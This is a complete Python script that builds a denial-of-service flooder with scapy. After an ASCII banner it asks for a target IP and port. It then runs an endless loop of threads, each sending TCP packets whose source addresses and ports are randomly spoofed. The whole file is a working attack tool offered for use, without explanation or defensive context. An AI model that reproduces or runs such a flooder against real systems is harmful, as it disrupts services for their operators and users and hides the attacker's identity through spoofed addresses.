#!/usr/bin/env python 

from scapy.all import *
import threading
import random
import time
import sys 

def RandomHost():
    #
    octetOne = str(random.randint(10,255))
    #
    octetTwo = str(random.randint(10,255))
    #
    octetThree = str(random.randint(10,255))
    #
    octetFour = str(random.randint(10,255))
    #
    host = octetOne+'.'+octetTwo+'.'+octetThree+'.'+octetFour
    #
    return host

def attack(target,port):
    #
    host = RandomHost() ; sourcePort = random.randint(1,65535)
    #
    ip = IP(src=host,dst=target)
    #
    tcp = TCP(sport=sourcePort,dport=port)
    #
    pkt = ip/tcp
    #
    print("[*] %s:%i >>> sent packet to >>> %s:%i " % (host,sourcePort,target,port))
    #
    send(pkt,inter=.001,verbose=False)
    #
    return

def main():
    #
    print("""
 **************************************
 *  ____             _       _        *
 * |  _ \  ___ _ __ (_) __ _| |       *
 * | | | |/ _ \ '_ \| |/ _` | |       *
 * | |_| |  __/ | | | | (_| | |       *
 * |____/ \___|_| |_|_|\__,_|_|       *
 *            ___  / _|               *
 *           / _ \| |_                *
 *  __ __    |(_) |  _|   _           *
 * / ___|  __\___/|_|   _(_) ___ ___  *
 * \___ \ / _ \ '__\ \ / / |/ __/ _ \ *
 *  ___) |  __/ |   \ V /| | (_|  __/ *
 * |____/ \___|_|    \_/ |_|\___\___| *
 **************************************
 *   Single Host Single Port Edition  *
 **************************************                                                                                
          """)
    #
    time.sleep(1)
    #
    target = input("[+] Enter the target address-> ")
    #
    port = int(input("[+] Enter the target port-> "))
    #
    print("[*] Target set to: %s:%i " % (target,port))
    #
    print("""
*************************
*** Initiating Attack ***
*************************
    """)
    #
    threads = []
    #
    while(True):
        #
        for i in range(0,10):
            #
            t = threading.Thread(target=attack,args=(target,port))
            #
            t.start()
            #
            threads.append(t)
            #
            for j in threads:
                #
                j.join()

if(__name__ == '__main__'):
    #
    main()